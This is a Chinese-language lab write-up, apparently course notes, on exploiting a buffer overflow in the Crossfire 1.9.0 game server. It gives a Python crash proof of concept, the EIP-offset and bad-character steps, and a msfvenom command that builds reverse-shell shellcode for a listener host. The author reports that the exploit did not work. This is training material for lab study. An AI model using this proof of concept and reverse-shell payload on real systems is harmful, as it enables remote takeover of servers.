# 10-Linux Buffer Overflows

> 本次实验没有成功。
>
> Crossfire 1.9.0：https://www.exploit-db.com/apps/43240af83a4414d2dcc19fff3af31a63-crossfire-1.9.0.tar.gz
>
> EDB：https://github.com/eteran/edb-debugger

在本模块中，我们将利用Crossfire介绍Linux缓冲区溢出，这是一个基于Linux的在线多人角色扮演游戏。

具体来说，当向setup sound命令传递超过4000字节的字符串时，Crossfire 1.9.0容易受到基于网络的缓冲区溢出的攻击。为了调试应用程序，我们将使用Evan Teran编写的Evans调试器(EDB)，它受OllyDbg的启发，为我们提供了一个熟悉的调试环境。

## 环境准备

> 这里需要注意一点，系统需要是32位的，安装虚拟机的时候也要注意一下，官网下载镜像的话一般是带i386字样的。

### 安装游戏

> 安装过程中如果遇到权限问题，建议用sudo运行或者切换到root用户

1、这个提供的是未编译的文件，需要自己编译一下，下载了之后先解压缩一下；

2、然后进入到文件夹中，运行 `./configure` ，之后会运行一小段时间，如果要关闭保护机制编译的话可以运行 `./configure CC="gcc -z execstack -fno-stack-protector -no-pie"` ；

3、运行 `make` ；

4、可以选择运行 `make check` 进行测试，一般不进行也没事；

5、运行 `make install` ；

6、可以选择运行 `make clean` 清理第二步产生的一些文件。

7、 `cd /usr/games/crossfire/bin/` 

8、 `./crossfire` 

之后就正常运行了

### 安装EDB

> 项目的github界面上已经提供了很详细的安装方法，这里把链接放在这里
>
> - https://github.com/eteran/edb-debugger/wiki/Compiling-(Fedora)
> - https://github.com/eteran/edb-debugger/wiki/Compiling-(Ubuntu)
> - https://github.com/eteran/edb-debugger/wiki/Compiling-(Debian)

## 复现崩溃

### EDB附加进程

运行了crossfire之后，会显示下面这个情况：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605524034289-afdecd26-4bf1-4d12-9764-aa797bc3bbab.png)

运行了edb去附加，

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605524103731-e2c159e0-0a4b-4ec5-92a9-38fe3ca1b6ec.png)

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605524128159-b3a19661-d24d-40ae-8290-8768034f7a38.png)

附加之后会使进程进入暂停状态，记得点播放按钮继续运行：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605581533082-0885e154-49d8-4234-8044-5d06468674f2.png)

### 准备PoC

这里用的是原文中的用python写的PoC，自己根据自己实际的靶机更新一下IP：

```
#! /usr/bin/python
import socket
host ="10.211.55.14"
crash = "\x41" * 4379
buffer = "\x11(setup sound " + crash + "\x90\x00#"
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
print("[*]Sending evil buffer...")
s.connect((host,13327))
print(s.recv(1024))
s.send(buffer)
s.close()
print("[*]Payload Sent !")
```

运行之后edb上就会显示一条异常：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605581722139-f1d829a2-fc17-43a0-a005-e70340c0277b.png)

可以看到这里的结果是有问题的，按理说应该是显示一串41的地址，但是实际上是没有的，研究了半天也没有研究出来。



## 控制EIP

### 生成唯一的缓冲字符串

```
msf-pattern_create -l 4379
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605526868132-8ee66c12-f1a1-4fc4-9d1f-a7c145c8d93c.png)

然后修改脚本，之后再重启crossfire，重新附加进程，重新运行脚本：

> 问题1：SyntaxError: Non-ASCII character '\xe2' in file ./control-eip.py on line 5, but no encoding declared;
>
> 解决方法：在文件开头添加 # coding:utf-8
>
> 问题2：SyntaxError: EOL while scanning string literal
>
> 解决办法：将字符串的双引号编程三引号

### 定位shellcode空间

如果改变字符长度导致不同的崩溃，那样我们就不可以随便增加长度了，然后文中给出的情况是EAX指向缓冲数据的栈顶，ESP指向的位置离缓冲数据底部还有几个字节空间，然后原文中给出的方法是，通过ESP指向的位置进行简单的操作，让EAX的值加几个字节跳过开头的"setup sound"字样，然后再跳转到EAX指向的区域执行。这样就有一大片空间可以被使用。

`msf-nasm_shell` 可以根据输入的汇编指令翻译成机器码。

### 检测坏字符

方法和上一节的WIndows缓冲区溢出一样，\x00肯定是不行的，然后从\x01~\xff测一下。

在多次运行概念验证并一次消除一个坏字符之后，原文中为Crossfire应用程序列出了一个最终的坏字符列表，它们看起来仅为\x00和\x20。

### 找一个返回地址

EDB自带Opcode Search插件，选择模块，右侧选择要利用的寄存器等，然后Find，最后选择给出的结果地址，下面只是查找示范。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605591419091-74e4e85a-5d60-4e4d-9b81-c48899e22071.png)

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605591466977-a7dce057-cfcf-4ed4-bb2b-298d50260021.png)

在插件中的Breakpoint Manager，可以根据地址设置断点：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605591608405-f16b29e3-1474-4fe7-b844-327692065e54.png)

## 获取shell

### 生成shellcode

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.211.55.4 LPORT=443 -b "\x00\x20" -f py -v shellcode
```

### 接收反向shell

之后就是在攻击机上用nc监听443端口，然后运行添加过shellcode的脚本，记得将客户机的EDB关掉，只开启crossfire，不要运行在调试状态下，EDB会对反向shell中的某些操作报异常。当然是原文说的，因为我没有成功复现。